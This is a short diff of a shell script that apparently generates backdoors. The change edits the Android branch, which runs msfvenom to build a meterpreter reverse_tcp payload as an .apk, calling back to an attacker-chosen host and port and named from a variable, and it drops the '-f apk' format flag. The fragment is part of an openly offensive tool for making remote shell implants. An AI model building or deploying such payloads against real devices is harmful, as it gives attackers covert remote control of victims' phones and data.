@@ -426,7 +426,7 @@ fi
 
 if [ $osbd = "android" ]
 then
-msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd -f apk > $namebd.apk
+msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd > $namebd.apk
 fi
 
 
